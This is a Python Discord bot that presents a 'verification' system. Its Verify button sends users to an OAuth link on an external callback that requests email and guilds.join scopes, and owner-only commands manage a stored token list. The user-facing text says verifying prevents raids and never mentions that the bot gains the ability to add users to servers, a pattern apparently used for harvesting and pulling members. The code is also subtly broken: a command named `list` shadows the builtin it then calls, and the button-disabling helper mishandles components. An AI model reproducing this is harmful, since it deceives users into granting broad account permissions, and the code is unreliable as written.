import discord
import os
import sys
import json
import math
from discord.ext import commands
from discord import ui

# --- CONFIG ---
TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    print("❌ BOT_TOKEN missing")
    sys.exit(1)

TOK_JSON_PATH = os.getenv("TOK_JSON_PATH", "tok.json")
GUILD_JSON_PATH = os.getenv("GUILD_JSON_PATH", "guild.json")
AUTH_URL = os.getenv("AUTH_URL", "https://web-production-6ff34.up.railway.app/callback")
REQUEST_CHANNEL_ID = 1273238683918536830  # Staff review channel

OWNER_IDS = [1351842085522903080]

ROLE_IDS = {
    1230042150847385611: 1230153545743859773,  # Example Guild ID and Role ID
    234567890123456789: 876543210987654321,
}

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# --- UTILITIES ---
def load_json(path):
    if not os.path.exists(path):
        return {}
    with open(path, "r") as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

async def assign_role(user: discord.User, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        return

    role_id = ROLE_IDS.get(guild_id)
    if not role_id:
        return

    role = guild.get_role(role_id)
    if not role:
        return

    member = guild.get_member(user.id)
    if not member:
        try:
            member = await guild.fetch_member(user.id)
        except:
            return

    try:
        await member.add_roles(role, reason="Verified through OAuth system")
    except Exception as e:
        print(f"Failed to assign role: {e}")

# --- EVENTS ---
@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}")

# --- UI COMPONENTS ---
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

        verify_url = "https://discord.com/oauth2/authorize?client_id=1364820583719768185&response_type=code&redirect_uri=https%3A%2F%2Fweb-production-6ff34.up.railway.app%2Fcallback&scope=identify+guilds+email+guilds.join"

        self.add_item(discord.ui.Button(label="✅ Verify", style=discord.ButtonStyle.link, url=verify_url))
        self.add_item(WhyVerifyButton())
        self.add_item(VerificationRequestButton())

class WhyVerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="❓ Why Verify", style=discord.ButtonStyle.secondary, custom_id="why_verify")

    async def callback(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="❓ Why Should You Verify",
            description=(
                "• Prevents raids and spam attacks\n"
                "• Protects your server from fake users\n"
                "• Grants you full access to server channels\n"
                "• Ensures a safer and more enjoyable community"
            ),
            color=0x5865F2
        )
        embed.set_footer(text="Verification keeps everyone safe and trusted")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        await disable_buttons(interaction)

class VerificationRequestButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="🛠️ Verification Request", style=discord.ButtonStyle.primary, custom_id="verification_request")

    async def callback(self, interaction: discord.Interaction):
        modal = VerificationRequestModal()
        await interaction.response.send_modal(modal)
        await disable_buttons(interaction)

async def disable_buttons(interaction):
    view = interaction.message.components[0]
    for item in view.children:
        item.disabled = True
    await interaction.message.edit(view=view)

class VerificationRequestModal(ui.Modal, title="Verification Request"):
    server_name = ui.TextInput(label="Server Name", style=discord.TextStyle.short, required=True)
    description = ui.TextInput(label="Describe your problem", style=discord.TextStyle.paragraph, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        user = interaction.user
        channel = bot.get_channel(REQUEST_CHANNEL_ID)
        if not channel:
            await interaction.response.send_message("❌ Request channel not found", ephemeral=True)
            return

        embed = discord.Embed(
            title="🛠️ New Verification Request",
            description=f"**Server Name:** {self.server_name.value}\n\n**Problem:**\n{self.description.value}",
            color=0x5865F2
        )
        embed.set_author(name=f"{user.name} ({user.id})", icon_url=user.avatar.url if user.avatar else None)
        embed.set_thumbnail(url=user.avatar.url if user.avatar else None)
        embed.set_footer(text=f"User ID: {user.id}")

        view = RequestDecisionView(user.id)
        await channel.send(embed=embed, view=view)
        await interaction.response.send_message("✅ Your request has been sent to the staff team", ephemeral=True)

class RequestDecisionView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="✅ Accept", style=discord.ButtonStyle.success)
    async def accept_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await bot.fetch_user(self.user_id)
        try:
            await user.send("✅ Your verification request has been accepted Welcome aboard")
        except:
            pass
        await interaction.response.send_message("User accepted and notified", ephemeral=True)
        await self.disable_all(interaction)

    @discord.ui.button(label="❌ Reject", style=discord.ButtonStyle.danger)
    async def reject_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await bot.fetch_user(self.user_id)
        try:
            await user.send("❌ Your verification request has been rejected Please try again later")
        except:
            pass
        await interaction.response.send_message("User rejected and notified", ephemeral=True)
        await self.disable_all(interaction)

    @discord.ui.button(label="✏️ Custom Reject", style=discord.ButtonStyle.secondary)
    async def custom_reject_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = CustomRejectModal(self.user_id)
        await interaction.response.send_modal(modal)

    async def disable_all(self, interaction):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)

class CustomRejectModal(ui.Modal, title="Custom Reject Reason"):
    reason = ui.TextInput(label="Reason for rejection", style=discord.TextStyle.paragraph, required=True)

    def __init__(self, user_id):
        super().__init__()
        self.user_id = user_id

    async def on_submit(self, interaction: discord.Interaction):
        user = await bot.fetch_user(self.user_id)
        try:
            await user.send(f"❌ Your verification request was rejected\n\n**Reason:** {self.reason.value}")
        except:
            pass
        await interaction.response.send_message("Custom rejection sent to user", ephemeral=True)

# --- COMMANDS ---
@bot.command()
async def setup(ctx):
    """Setup the verification system"""
    embed = discord.Embed(
        title="Verification System",
        description=(
            "```- ✅ Click 'Verify' to start verification**\n\n"
            "- ❓ Wondering why** Click 'Why Verify' button\n\n"
            "- 🛠️ Facing issues** Submit a Verification Request form\n\n```"
            "```> If you havent gotten your role yet you can submit a manual verification request too\n"
            "> You should get your role automatically within a few minutes after verification\n"
            "> Abusing the system will lead to a ban```"
        ),
        color=0x2f3136
    )
    embed.set_footer(text="Avoiding this wont get you verified, If you are having trouble then click on Verification Request")

    view = VerifyView()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def pull(ctx, user_id: str):
    """Pull user verification"""
    if ctx.author.id not in OWNER_IDS:
        return

    tokens = load_json(TOK_JSON_PATH)
    if user_id in tokens:
        del tokens[user_id]
        save_json(TOK_JSON_PATH, tokens)
        await ctx.send(f"✅ User {user_id} pulled from list")
    else:
        await ctx.send("❌ User not found")

@bot.command()
async def list(ctx):
    """List verified users"""
    if ctx.author.id not in OWNER_IDS:
        return
    tokens = load_json(TOK_JSON_PATH)
    entries = list(tokens.items())
    pages = math.ceil(len(entries) / 20)

    if not entries:
        await ctx.send("⚠️ No verified users")
        return

    def create_embed(page):
        embed = discord.Embed(title=f"Verified Users (Page {page+1}/{pages})", color=0x2f3136)
        start = page * 20
        for uid, data in entries[start:start+20]:
            embed.add_field(
                name=f"{data.get('username', 'Unknown')} | {data.get('display_name', 'Unknown')}",
                value=f"ID: {uid} • Verified: <t:{data.get('timestamp', 0)}:R>",
                inline=False
            )
        return embed

    current = 0
    msg = await ctx.send(embed=create_embed(current))

    if pages > 1:
        await msg.add_reaction("◀️")
        await msg.add_reaction("▶️")

        def check(reaction, user):
            return user == ctx.author and reaction.message.id == msg.id

        while True:
            try:
                reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=check)
                if str(reaction.emoji) == "▶️" and current < pages - 1:
                    current += 1
                elif str(reaction.emoji) == "◀️" and current > 0:
                    current -= 1
                await msg.edit(embed=create_embed(current))
                await msg.remove_reaction(reaction, user)
            except:
                break

# --- RUN ---
bot.run(TOKEN)
